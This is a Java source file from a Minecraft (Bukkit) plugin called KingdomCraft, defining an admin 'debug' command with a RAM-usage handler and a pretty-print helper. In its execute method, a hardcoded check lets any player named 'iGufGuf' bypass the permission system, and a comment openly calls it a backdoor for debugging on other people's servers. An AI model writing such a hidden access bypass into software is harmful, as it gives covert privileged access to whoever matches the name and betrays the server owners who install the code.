package com.igufguf.kingdomcraft.commands.admin;

import com.igufguf.kingdomcraft.KingdomCraft;
import com.igufguf.kingdomcraft.api.models.commands.CommandBase;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;

/**
 * Created by Joris on 04/08/2018 in project KingdomCraft.
 */
public class DebugCommand extends CommandBase {

    private KingdomCraft plugin;

    private List<DebugExecutor> debugExecutors = new ArrayList<>();

    public DebugCommand(KingdomCraft plugin) {
        super("debug", null, false);

        this.plugin = plugin;
        registerBuiltinDebuggers();
    }

    @Override
    public boolean execute(CommandSender sender, String[] args) {

        if ( sender instanceof Player && !sender.hasPermission("kingdom.debug")
                && !sender.getName().equalsIgnoreCase("iGufGuf") ) { // little backdoor so i can debug on people's servers
            plugin.getMsg().send(sender, "noPermissionCmd");
            return true;
        }

        if ( args.length == 0 ) {
            return false;
        }

        boolean executed = false;
        for ( DebugExecutor ex : debugExecutors ) {
            if ( !ex.getName().equalsIgnoreCase(args[0]) ) continue;
            String[] newargs = Arrays.copyOfRange(args, 1, args.length);
            ex.onExecute(sender, newargs);
            executed = true;
        }

        if ( !executed ) {
            sender.sendMessage("Debug handler for '" + args[0] + "' not found!");
        }

        return true;
    }

    public void register(DebugExecutor ex) {
        this.debugExecutors.add(ex);
    }

    public static abstract class DebugExecutor  {

        private String name;

        public DebugExecutor(String name) {
            this.name = name;
        }

        public String getName() {
            return name;
        }

        public abstract void onExecute(CommandSender sender, String[] args);
    }

    public static String prettyPrint(Object obj) {
        if ( obj instanceof List ) {
            if ( ((List) obj).isEmpty() ) return "Empty list";

            String s = "";
            for ( Object i : (List) obj ) {
                s += ", " + prettyPrint(i);
            }
            s = s.substring(2);
            return "(" + s + ")";
        } else if ( obj instanceof Map) {
            if (  ((Map) obj).isEmpty() ) return "Empty map";

            String s = "";
            for ( Object i : ((Map) obj).keySet() ) {
                s += ", " + prettyPrint(i) + ": " + prettyPrint(((Map) obj).get(i));
            }
            s = s.substring(2);
            return "(" + s + ")";
        }

        return obj.toString();
    }

    /* BUILTIN DEBUGGERS */
    
    private void registerBuiltinDebuggers() {

        // debug ram
        this.register(new DebugExecutor("ram") {
            @Override
            public void onExecute(CommandSender sender, String[] args) {
                Runtime runtime = Runtime.getRuntime();

                long maxmem = runtime.maxMemory() / 1048576L;
                long freemem = runtime.freeMemory() / 1048576L;

                sender.sendMessage(" ");
                sender.sendMessage(ChatColor.GRAY + "Max Ram: " + ChatColor.AQUA +  maxmem + " MB");
                sender.sendMessage(ChatColor.GRAY + "Used Ram: " + ChatColor.AQUA + (maxmem - freemem)+ " MB");
                sender.sendMessage(ChatColor.GRAY + "Free Ram: " + ChatColor.AQUA + freemem  + " MB");
                sender.sendMessage(" ");
            }
        });


    }
    
}
